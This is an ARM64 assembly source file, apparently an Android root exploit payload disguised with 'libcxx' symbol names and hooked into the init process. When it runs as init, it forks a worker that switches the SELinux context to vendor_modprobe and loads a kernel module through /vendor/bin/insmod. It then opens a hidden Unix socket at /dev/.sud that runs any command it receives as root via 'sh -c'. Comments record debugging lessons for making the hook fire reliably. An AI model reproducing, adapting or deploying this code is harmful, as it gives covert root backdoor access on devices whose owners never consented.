    .arch armv8-a

    .include "include.inc"

    .global libcxx_start
    .global libcxx_data
    .global libcxx_len
    .global libcxx_first_inst_copy
    .data


libcxx_data:

mutex_file:
    .asciz "/dev/df"
mk_fh:
    .asciz "/dev/dfH"
exe_path:
    .asciz "/vendor/bin/insmod"
selinux_ctx:
    .asciz "u:r:vendor_modprobe:s0"
selinux_ctx_end:
attr_exec:
    .asciz "/proc/self/attr/exec"
err_file:
    .asciz "/data/local/tmp/inserr"
mk_r0:
    .asciz "/dev/dfr0"
mk_r1:
    .asciz "/dev/dfr1"
mk_m0:
    .asciz "/dev/dfm0"
sudsock_path:
    .asciz "/dev/.sud"
sh_path:
    .asciz "/system/bin/sh"
mk_probe:
    .asciz "/dev/dfPROBE"
mk_ws:
    .asciz "/dev/dfws"
mk_rooted:
    .asciz "/dev/dfROOTED"
dash_c:
    .asciz "-c"
ko_target:
    .ascii "/vendor/lib64/libbinderdebug.so\0"
ko_target_end:
    .skip 32, 0                             /* pad to 64 bytes — longest candidate path */

    .balign 4
    .global libcxx_ko_target_off
libcxx_ko_target_off:
    .int ko_target - libcxx_data
    .global libcxx_soft_reboot_off
libcxx_soft_reboot_off:
    .int soft_reboot_flag - libcxx_data
soft_reboot_flag:
    .byte 0

    .align 4

libcxx_start:
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!
    stp x19, x20, [sp, #-16]!   // o1s v50: shell uses x19 (trace fd);
                                // x19-x28 are callee-saved (init's own!).

    // Detect root uid = 0
    mov     x8, SYS_getuid
    svc     0
    cbnz    w0, return

    // Detect init tid = 1
    // We need thread 1 to use the default namespace
    mov     x8, SYS_gettid
    svc     0
    cmp     w0, 1
    bne     return

    // To avoid later call of hook to execute payload, create file as mutex.
    // Mutex: openat(AT_FDCWD, "/dev/df", O_CREAT|O_EXCL|O_CLOEXEC, 0)
    // NOTE (o1s lesson, 2026-10-01): do NOT unlink stale markers here.
    // /dev is devtmpfs (wiped every boot), so a present /dev/df always
    // means THIS boot already fired. Unlinking re-arms the hook on every
    // init log call -> insmod storm -> module-load deadlock -> hardlockup
    // (lastkmsg #127: 5 concurrent insmods, TASK STUCK init).
    mov     x0, -100
    adr     x1, mutex_file
    movl    x2, (O_CREAT|O_EXCL|O_CLOEXEC)
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0

    // return if fail to open (file exist)
    tbnz    w0, #31, return
    // hook-fire proof (fresh mtime every firing, plain CREAT): separates
    // "hook never fired" from "worker died". Worker never touches dfH.
    mov     x0, -100
    adr     x1, mk_fh
    movl    x2, (O_WRONLY|O_CREAT|O_CLOEXEC)
    mov     x3, #0420
    mov     x8, #SYS_openat
    svc     0

    sub     sp, sp, 16

    // syscall(SYS_gettid);
    mov     x8, SYS_gettid
    svc     0
    str     w0, [sp, 8]

    // clone(CLONE_CHILD_SETTID   |
    //       CLONE_CHILD_CLEARTID |
    //       SIGCHLD, 0, NULL, NULL, &ctid)
    // NOTE: NO CLONE_VM here (although tempting for ENOMEM): worker runs
    // seconds while init resumes immediately; shared stack would corrupt
    // both. Full fork copies init mm (costly but safe); vfork-style is
    // only safe for immediately-exec'ing children (sud_child pattern).
    // Birth retry (o1s v62): clone fails fast (ENOMEM) under pressure;
    // spin briefly (transient dips pass in microseconds). On giveup,
    // UNLINK the mutex (next init log refires fresh — harmless, no
    // worker/insmod was ever born, so no #127 storm possible).
    mov     w9, #200
hk_retry:
    mov     x8, SYS_clone
    add     x4, sp, 8           // ctid
    mov     x3, xzr              // newtls
    mov     x2, xzr              // ptid
    mov     x1, xzr              // stack
    movl    x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
    svc     0
    cmp     w0, #0
    bge     hk_ok
    sub     w9, w9, #1
    cbnz    w9, hk_retry
    mov     x0, -100            // give up: unlink mutex for a later refire
    adr     x1, mutex_file
    mov     x2, xzr
    mov     x8, #35             // SYS_unlinkat
    svc     0
    b       return
hk_ok:
    str     w0, [sp, 8]         // save id
    add     sp, sp, 16

    cbnz    w0, return          // parent returns to init

    // ── worker child ──────────────────────────────────────────────────────
    // frame: [0..24] argv/status, [28] logfd, [32..56] sockaddr, [64..] logm
    sub     sp, sp, 192
    // grandchild (ko via vendor insmod, PROVEN vehicle): attr-write to
    // vendor_modprobe (load-bearing domain!), argv [insmod, ko_target],
    // clone+wait, dfr0/dfr1 markers, then server below (ko-first!).
    mov     x0, #SIGCHLD
    mov     x1, xzr
    mov     x2, xzr
    mov     x3, xzr
    mov     x4, xzr             // ctid (valid ptr required w/ SETTID)
    mov     x8, #SYS_clone
    svc     0
    str     w0, [sp, 24]
    cbz     w0, grandchild
    str     x0, [sp, 16]
    add     x1, sp, 20
    mov     x2, xzr
    mov     x3, xzr
    mov     x8, #SYS_wait4
    svc     0
    ldr     w1, [sp, 20]
    lsr     w1, w1, #8
    and     w1, w1, #0xff
    cbnz    w1, g_rcnz
    adr     x1, mk_r0
    b       g_mkrc
g_rcnz:
    adr     x1, mk_r1
g_mkrc:
    mov     x0, -100
    movl    x2, (O_WRONLY|O_CREAT|O_CLOEXEC)
    mov     x3, #0420
    mov     x8, #SYS_openat
    svc     0
    ldr     w1, [sp, 20]          // raw status: 0 <=> exit 0
    cbnz    w1, worker_cleanup    // ko failed: nothing downstream works
    // v82 dispatch server: EMPTY command = zero-fork probe (worker
    // creates dfROOTED itself, no fork/exec); otherwise fork + exec
    // sh -c <buf> (echo/touch ladder) with raw wait status into dfws.
    mov     x0, xzr               // umask(0): exact modes below
    mov     x8, #166
    svc     0
    mov     x0, #1                // AF_UNIX
    movl    x1, (1|0x80000)      // SOCK_STREAM|SOCK_CLOEXEC
    mov     x2, xzr
    mov     x8, #SYS_socket
    svc     0
    cmp     w0, #0
    blt     worker_cleanup
    mov     x19, x0               // srv fd
    mov     w9, #1
    strh    w9, [sp, 64]
    adr     x9, sudsock_path
    add     x10, sp, #66
    mov     x11, xzr
sv_path:
    ldrb    w12, [x9, x11]
    strb    w12, [x10, x11]
    add     x11, x11, #1
    cbnz    w12, sv_path
    mov     x0, x19
    add     x1, sp, #64
    mov     x2, #110
    mov     x8, #SYS_bind
    svc     0
    cmp     w0, #0
    blt     worker_cleanup
    mov     x0, x19
    mov     x1, #4
    mov     x8, #SYS_listen
    svc     0
    cmp     w0, #0
    blt     worker_cleanup
    mov     x0, -100            // marker dfm0 (SERVING now)
    adr     x1, mk_m0
    movl    x2, (O_WRONLY|O_CREAT|O_CLOEXEC)
    mov     x3, #0420
    mov     x8, #SYS_openat
    svc     0
sv_accept:
    mov     x0, x19
    mov     x1, xzr
    mov     x2, xzr
    mov     x8, #SYS_accept
    svc     0
    cmp     w0, #0
    blt     sv_accept
    str     x0, [sp, 24]        // client fd
    // v82: dfPROBE marker (accepted a client — connect alone proves
    // nothing, listen backlog completes it; only accept proves alive).
    // Marker fds intentionally leaked (few accepts/boot, one-shot worker).
    mov     x0, -100
    adr     x1, mk_probe
    movl    x2, (O_WRONLY|O_CREAT|O_CLOEXEC)
    mov     x3, #0420
    mov     x8, #SYS_openat
    svc     0
    // Read command (<=96B) into [sp, 80] (frame 192: 80+96=176 fits).
    // shutdownOutput) = zero-fork probe: worker itself creates dfROOTED
    // (NO fork/exec). Non-empty = ladder: fork + exec sh -c <buf>.
    ldr     x0, [sp, 24]
    add     x1, sp, #80
    mov     x2, #96
    mov     x8, #SYS_read
    svc     0
    cmp     w0, #1
    blt     sv_zero
    add     x9, sp, #80
    strb    wzr, [x9, w0, sxtw]  // NUL-terminate at count
sv_fork:
    // vfork per client (CLONE_VM: no page-table copy, no reclaim spike;
    // CLONE_VFORK: parent blocks till child execs/exits, no orphan).
    mov     x0, #(SIGCHLD|0x100|0x4000)
    mov     x1, xzr
    mov     x2, xzr
    mov     x3, xzr
    mov     x8, #SYS_clone
    svc     0
    cbz     w0, sv_child
    blt     sv_clonefail
    // parent: close client, wait ANY child (sequential loop: at most one
    // live child; grandchild long reaped), record raw status into dfws.
    ldr     x0, [sp, 24]
    mov     x8, #SYS_close
    svc     0
    movn    x0, #0              // wait4(-1): any child
    add     x1, sp, 20
    mov     x2, xzr
    mov     x3, xzr
    mov     x8, #SYS_wait4
    svc     0
    b       sv_wstat
sv_clonefail:
    str     w0, [sp, 20]        // -errno as status (clone itself died)
sv_wstat:
    mov     x0, -100
    adr     x1, mk_ws
    movl    x2, (O_WRONLY|O_CREAT|O_CLOEXEC)
    mov     x3, #0444           // world-readable: app must READ status
    mov     x8, #SYS_openat
    svc     0
    add     x1, sp, #20         // x0 still = ws fd
    mov     x2, #4
    mov     x8, #SYS_write
    svc     0
    b       sv_accept
sv_zero:
    // zero-fork probe: fixed target (generality is v83's problem).
    mov     x0, -100
    adr     x1, mk_rooted
    movl    x2, (O_WRONLY|O_CREAT|O_CLOEXEC)
    mov     x3, #0420
    mov     x8, #SYS_openat
    svc     0
sv_close:
    ldr     x0, [sp, 24]
    mov     x8, #SYS_close
    svc     0
    b       sv_accept
sv_child:
    // ladder: argv [sh, "-c", buf, NULL] ([sp, 0..24]; cfd slot reused,
    // child never returns). sh -c never reads stdin: socket only carries
    // the command. exec fail -> exit 127 (dfws tells it apart).
    adr     x0, sh_path
    str     x0, [sp, 0]
    adr     x0, dash_c
    str     x0, [sp, 8]
    add     x0, sp, #80
    str     x0, [sp, 16]
    str     xzr, [sp, 24]
    mov     x1, sp
    adr     x0, sh_path
    mov     x2, xzr
    mov     x8, #SYS_execve
    svc     0
    mov     x0, #127
    mov     x8, #94
    svc     0
worker_cleanup:
    // NOTE (o1s lesson, 2026-10-01, second edition): do NOT unlink the
    // mutex here. One shot per boot is the correct semantic (/dev is
    // devtmpfs: clean every boot; same-boot reruns need a reboot anyway).
    // Unlink-on-completion re-arms the hook on every init log call and
    // causes an insmod storm -> module-load deadlock -> hardlockup (#127).
    b       myexit

    // ── logm: log NUL-terminated msg at x0 to logd (tag DFRC). ──
    // Own frame (144B); worker slots reachable at sp+144. Clobbers x0-x7.
    // Reached ONLY via bl (never falls through from worker).
grandchild:
    mov     x0, -100
    adr     x1, attr_exec
    movl    x2, (O_WRONLY|O_CLOEXEC)
    mov     x8, #SYS_openat
    svc     0
    adr     x1, selinux_ctx
    mov     x2, selinux_ctx_end - selinux_ctx
    mov     x8, #SYS_write
    svc     0
    adr     x1, exe_path
    str     x1, [sp]
    adr     x1, ko_target
    str     x1, [sp, 8]
    str     xzr, [sp, 16]
    mov     x0, -100
    adr     x1, err_file
    movl    x2, (O_WRONLY|O_CREAT|O_APPEND|O_CLOEXEC)
    mov     x3, #0644
    mov     x8, #SYS_openat
    svc     0
    mov     x1, x0
    mov     x0, #2
    mov     x2, xzr
    mov     x8, #SYS_dup3
    svc     0
    adr     x0, exe_path
    mov     x1, sp
    mov     x2, xzr
    mov     x8, #SYS_execve
    svc     0
    mov     x0, #1
    mov     x8, #SYS_exit
    svc     0
myexit:
    mov     x0, #1
    mov     x8, #SYS_exit
    svc     0

return:
    ldp x19, x20, [sp], #16
    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16
libcxx_first_inst_copy:
    stp     x29, x30, [sp, #-32]!
    b       end
end:

libcxx_end:
libcxx_len:
    .word libcxx_end - libcxx_data
